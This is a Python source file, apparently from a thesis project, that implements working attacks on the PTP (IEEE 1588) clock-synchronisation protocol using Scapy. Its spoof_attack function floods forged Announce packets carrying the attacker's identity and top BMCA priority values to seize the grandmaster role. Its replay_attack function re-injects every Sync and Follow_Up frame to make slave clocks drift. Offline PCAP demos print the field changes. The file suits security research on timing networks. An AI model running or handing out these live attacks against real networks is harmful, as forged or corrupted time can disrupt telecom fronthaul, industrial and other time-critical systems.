"""
PTP spoof and replay attack implementations.

Two live attacks (run on the Pi against the real FH network):
  spoof_attack()  — win BMCA by flooding spoofed Announce packets
  replay_attack() — duplicate every Sync/Follow_Up to corrupt slave timing

Two offline demos (read a captured PCAP, print what the attack would do):
  spoof_attack_demo(pcap_path)  — show before/after field manipulation
  replay_attack_demo(pcap_path) — list every packet that would be replayed

Usage:
  sudo python main.py spoof [--duration SECS]
  sudo python main.py replay [--duration SECS]
  python main.py spoof_demo [--pcap path/to/capture.pcap]
  python main.py replay_demo [--pcap path/to/capture.pcap]

Config is read from Thesis/.env (one directory above this file).
--duration overrides SPOOF_DURATION / REPLAY_DURATION from .env when given.
"""

import argparse
import collections
import os
import queue
import threading
import time

from dotenv import load_dotenv
from scapy.all import Dot1Q, Ether, PcapReader, Raw, sendp, sniff  # type: ignore

# Load .env from Thesis/ (one level up from attacks/)
load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), "..", ".env"))

# IEEE 1588 EtherType carried in every PTP frame
PTP_ETHERTYPE  = 0x88F7
# 802.1Q VLAN tag EtherType
DOT1Q_ETHERTYPE = 0x8100

# PTP message type values (low nibble of first payload byte)
MSG_ANNOUNCE = 0x0B
MSG_SYNC     = 0x00
MSG_FOLLOWUP = 0x08


# ── helpers ────────────────────────────────────────────────────────────────────

def _mac_to_clock_identity(mac: str, insert: bytes) -> bytes:
    """
    Derive an 8-byte PTP ClockIdentity from a 6-byte MAC by inserting
    2 bytes in the middle — matches the convention in Announce_Attack.py:
      insert=b'\xff\xff' for sourcePortIdentity.clockIdentity
      insert=b'\xff\xfe' for grandmasterIdentity
    """
    raw = bytes.fromhex(mac.replace(":", ""))
    half = len(raw) // 2           # 3
    return raw[:half] + insert + raw[half:]


def _get_iface_mac(iface: str) -> str:
    """Read the MAC address of a network interface from sysfs (Linux/Pi)."""
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()


def _is_ptp_frame(pkt) -> bool:
    """
    Return True if pkt carries a PTP payload.

    Handles both untagged frames (EtherType=0x88F7) and 802.1Q VLAN-tagged
    frames (EtherType=0x8100, inner Dot1Q.type=0x88F7).  In both cases Scapy
    parses Dot1Q as its own layer, so pkt.load is always the raw PTP payload
    without any VLAN header — byte offsets remain correct in either path.
    """
    if Ether not in pkt:
        return False
    etype = pkt[Ether].type
    if etype == PTP_ETHERTYPE:
        return True
    if etype == DOT1Q_ETHERTYPE:
        return Dot1Q in pkt and pkt[Dot1Q].type == PTP_ETHERTYPE
    return False


def _is_ptp_type(pkt, msg_type: int) -> bool:
    """Return True if pkt is a PTP frame of the given message type."""
    return (
        _is_ptp_frame(pkt)
        and hasattr(pkt, "load")
        and len(pkt.load) > 0
        and (pkt.load[0] & 0x0F) == msg_type   # low nibble encodes message type
    )


# ── live attack 1: Announce spoof ─────────────────────────────────────────────

def spoof_attack(duration: int | None = None) -> None:
    """
    Live BMCA subversion attack (run on the Pi).

    Waits for one real Announce from the legitimate grandmaster, then floods
    a modified copy with the attacker's identity and the best possible BMCA
    priority values. The PTP slave will switch its grandmaster to the attacker.

    duration overrides SPOOF_DURATION from .env when provided.
    """
    iface       = os.getenv("IFACE", "eth0")
    src_mac     = os.getenv("SPOOF_SRC_MAC") or _get_iface_mac(iface)
    priority1   = int(os.getenv("SPOOF_PRIORITY1", "0"))
    priority2   = int(os.getenv("SPOOF_PRIORITY2", "0"))
    clock_class = int(os.getenv("SPOOF_CLOCK_CLASS", "0"))
    duration    = duration if duration is not None else int(os.getenv("SPOOF_DURATION", "60"))
    interval    = float(os.getenv("SPOOF_INTERVAL", "0.125"))

    # EUI-64 style identities derived from the attacker MAC
    clock_id  = _mac_to_clock_identity(src_mac, b"\xff\xff")  # for sourcePortIdentity
    master_id = _mac_to_clock_identity(src_mac, b"\xff\xfe")  # for grandmasterIdentity

    print(f"[spoof] Listening on {iface} for a real Announce packet ...")

    def _on_announce(pkt):
        if not _is_ptp_type(pkt, MSG_ANNOUNCE):
            return None  # keep sniffing

        payload = bytearray(pkt.load)

        # Overwrite source identity so BMCA attributes the clock to the attacker
        payload[20:28] = clock_id          # sourcePortIdentity.clockIdentity

        # Set grandmaster quality fields to the lowest (= best) possible values
        payload[47]    = priority1         # grandmasterPriority1
        payload[48]    = clock_class       # grandmasterClockQuality.clockClass
        payload[52]    = priority2         # grandmasterPriority2
        payload[53:61] = master_id         # grandmasterIdentity

        # Build the spoofed Ethernet frame with the attacker's source MAC
        spoofed = Ether(src=src_mac, dst=pkt[Ether].dst, type=PTP_ETHERTYPE) / Raw(load=bytes(payload))

        print(f"[spoof] Template captured. Flooding for {duration}s every {interval}s ...")
        deadline = time.time() + duration
        seq = int.from_bytes(payload[30:32], "big")

        while time.time() < deadline:
            seq = (seq + 1) & 0xFFFF              # wrap at 16-bit boundary
            payload[30:32] = seq.to_bytes(2, "big")  # increment sequenceId each send
            spoofed[Raw].load = bytes(payload)
            sendp(spoofed, iface=iface, verbose=False)
            time.sleep(interval)

        print("[spoof] Done.")
        return True  # non-None return stops sniff()

    # stop_filter fires _on_announce; sniff blocks until it returns truthy
    sniff(iface=iface, stop_filter=_on_announce)


# ── live attack 2: Sync + Follow_Up replay ────────────────────────────────────

def replay_attack(duration: int | None = None) -> None:
    """
    Live replay attack (run on the Pi).

    Re-injects every Sync and Follow_Up packet seen on the interface.
    The slave receives each timing message twice per interval, corrupting
    its offset and delay calculations and causing gradual clock drift.

    Fixes applied vs. the naive implementation:
    - sendp() runs in a dedicated sender thread so the sniff callback never
      blocks, preventing missed packets on slower hardware (Pi).
    - A rolling dedup window tracks (msg_type, seq_id) pairs already queued
      for replay; if a sniffed packet matches a recently queued key it is
      skipped, breaking the feedback loop that would otherwise occur when
      Scapy's raw socket sees its own injected frames on the same interface.
    - _is_ptp_frame() is used for frame detection, which handles both
      untagged and 802.1Q VLAN-tagged PTP frames correctly.

    duration overrides REPLAY_DURATION from .env when provided.
    """
    iface    = os.getenv("IFACE", "eth0")
    duration = duration if duration is not None else int(os.getenv("REPLAY_DURATION", "30"))

    tx_queue: queue.Queue = queue.Queue()

    # Rolling dedup window for (msg_type, seq_id) pairs.
    # maxlen=128 covers >60 s at the standard 2 Hz Sync+Follow_Up pair rate.
    _seen: collections.deque = collections.deque(maxlen=128)

    def _sender() -> None:
        """Drain the TX queue in a dedicated thread so sendp() never blocks sniff."""
        while True:
            pkt = tx_queue.get()
            if pkt is None:   # sentinel: time to exit
                break
            sendp(pkt, iface=iface, verbose=False)

    sender = threading.Thread(target=_sender, daemon=True)
    sender.start()

    print(f"[replay] Re-injecting Sync + Follow_Up on {iface} for {duration}s ...")

    def _on_pkt(pkt) -> None:
        if not _is_ptp_frame(pkt):
            return
        if not (hasattr(pkt, "load") and pkt.load):
            return
        msg = pkt.load[0] & 0x0F
        if msg not in (MSG_SYNC, MSG_FOLLOWUP):
            return

        # Deduplicate: skip packets whose (msg_type, seq_id) was already queued.
        # Scapy's raw socket delivers our own injected frames back to the sniffer;
        # since we replay unmodified packets the seq_id is identical to the
        # original, so any second sighting of the same key is our own replay.
        seq_id = int.from_bytes(pkt.load[30:32], "big")
        key = (msg, seq_id)
        if key in _seen:
            return
        _seen.append(key)
        tx_queue.put(pkt)

    sniff(iface=iface, prn=_on_pkt, timeout=duration)
    tx_queue.put(None)    # signal sender thread to exit
    sender.join()
    print("[replay] Done.")


# ── demo 1: spoof field manipulation on a PCAP ────────────────────────────────

def spoof_attack_demo(pcap_path: str | None = None) -> None:
    """
    Offline demo of the spoof attack.

    Loads a PCAP, finds the first Announce packet, and prints a before/after
    comparison of every field that would be modified — no packets are sent.
    """
    pcap_path   = pcap_path or os.getenv("PCAP_PATH", "./ptp_server.pcap")
    src_mac     = os.getenv("SPOOF_SRC_MAC", "02:11:22:33:44:55")
    priority1   = int(os.getenv("SPOOF_PRIORITY1", "0"))
    priority2   = int(os.getenv("SPOOF_PRIORITY2", "0"))
    clock_class = int(os.getenv("SPOOF_CLOCK_CLASS", "0"))

    clock_id  = _mac_to_clock_identity(src_mac, b"\xff\xff")
    master_id = _mac_to_clock_identity(src_mac, b"\xff\xfe")

    print(f"[spoof_demo] Reading: {pcap_path}")

    # Find the first Announce packet in the capture
    template = None
    with PcapReader(pcap_path) as pcap:
        for pkt in pcap:
            if _is_ptp_type(pkt, MSG_ANNOUNCE):
                template = pkt
                break

    if template is None:
        print("[spoof_demo] No Announce packet found in the PCAP.")
        return

    orig    = bytes(template.load)
    payload = bytearray(orig)

    # ── before ────────────────────────────────────────────────────────────────
    print("\n--- Announce fields BEFORE spoofing ---")
    print(f"  Ether.src                        : {template[Ether].src}")
    print(f"  sourcePortIdentity.clockIdentity : {orig[20:28].hex(':')}")
    print(f"  grandmasterPriority1             : {orig[47]}")
    print(f"  grandmasterClockQuality.class    : {orig[48]}")
    print(f"  grandmasterPriority2             : {orig[52]}")
    print(f"  grandmasterIdentity              : {orig[53:61].hex(':')}")

    # Apply the same modifications as the live attack
    payload[20:28] = clock_id
    payload[47]    = priority1
    payload[48]    = clock_class
    payload[52]    = priority2
    payload[53:61] = master_id

    # ── after ─────────────────────────────────────────────────────────────────
    print("\n--- Announce fields AFTER spoofing ---")
    print(f"  Ether.src                        : {src_mac}  ← attacker MAC")
    print(f"  sourcePortIdentity.clockIdentity : {payload[20:28].hex(':')}  ← MAC + FF:FF insert")
    print(f"  grandmasterPriority1             : {payload[47]}  ← 0 = best in BMCA")
    print(f"  grandmasterClockQuality.class    : {payload[48]}  ← 0 = best in BMCA")
    print(f"  grandmasterPriority2             : {payload[52]}  ← 0 = best in BMCA")
    print(f"  grandmasterIdentity              : {payload[53:61].hex(':')}  ← MAC + FF:FE insert")

    print(
        "\nEffect: BMCA on every slave compares these fields in order. "
        "Priority1=0 and ClockClass=0 are lower than any legitimate grandmaster value, "
        "so the slave will elect the attacker as the new grandmaster and sync to its clock."
    )


# ── demo 2: replay packet listing on a PCAP ───────────────────────────────────

def replay_attack_demo(pcap_path: str | None = None) -> None:
    """
    Offline demo of the replay attack.

    Loads a PCAP and lists every Sync and Follow_Up packet that would be
    re-injected, showing the timing fields that the slave relies on.
    No packets are sent.
    """
    pcap_path = pcap_path or os.getenv("PCAP_PATH", "./captures/ptp_server.pcap")

    print(f"[replay_demo] Reading: {pcap_path}")

    rows = []
    with PcapReader(pcap_path) as pcap:
        for pkt in pcap:
            if not _is_ptp_frame(pkt):
                continue
            if not (hasattr(pkt, "load") and pkt.load):
                continue

            msg = pkt.load[0] & 0x0F               # low nibble = message type
            if msg not in (MSG_SYNC, MSG_FOLLOWUP):
                continue

            payload   = bytes(pkt.load)
            seq_id    = int.from_bytes(payload[30:32], "big")      # sequenceId field
            ts_sec    = int.from_bytes(payload[34:40], "big")      # originTimestamp seconds
            ts_nsec   = int.from_bytes(payload[40:44], "big")      # originTimestamp nanoseconds
            label     = "Sync" if msg == MSG_SYNC else "Follow_Up"
            rows.append((label, seq_id, ts_sec, ts_nsec, pkt[Ether].src))

    if not rows:
        print("[replay_demo] No Sync or Follow_Up packets found in the PCAP.")
        return

    # Print table
    print(f"\n{'Type':<12} {'SeqID':>6}  {'Timestamp (s)':<14} {'Timestamp (ns)':<14}  Source MAC")
    print("-" * 72)
    for label, seq, ts_s, ts_ns, mac in rows:
        print(f"{label:<12} {seq:>6}  {ts_s:<14} {ts_ns:<14}  {mac}")

    print(f"\nTotal packets that would be replayed: {len(rows)}")
    print(
        "\nEffect: the slave receives each Sync/Follow_Up twice within the same interval. "
        "Its path-delay and offset filters average over the duplicates, introducing a "
        "systematic error that accumulates into measurable clock drift over time."
    )


# ── entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PTP spoof and replay attack demos")
    parser.add_argument(
        "mode",
        choices=["spoof", "replay", "spoof_demo", "replay_demo"],
        help="Attack mode: 'spoof'/'replay' are live (need root + Pi NIC); "
             "'spoof_demo'/'replay_demo' are offline PCAP analysis",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=None,
        metavar="SECS",
        help="How long (seconds) to run the live attack. "
             "Overrides SPOOF_DURATION / REPLAY_DURATION from .env.",
    )
    parser.add_argument(
        "--pcap",
        default=None,
        help="Path to PCAP file for demo modes (overrides PCAP_PATH in .env)",
    )
    args = parser.parse_args()

    if args.mode == "spoof":
        spoof_attack(args.duration)
    elif args.mode == "replay":
        replay_attack(args.duration)
    elif args.mode == "spoof_demo":
        spoof_attack_demo(args.pcap)
    elif args.mode == "replay_demo":
        replay_attack_demo(args.pcap)
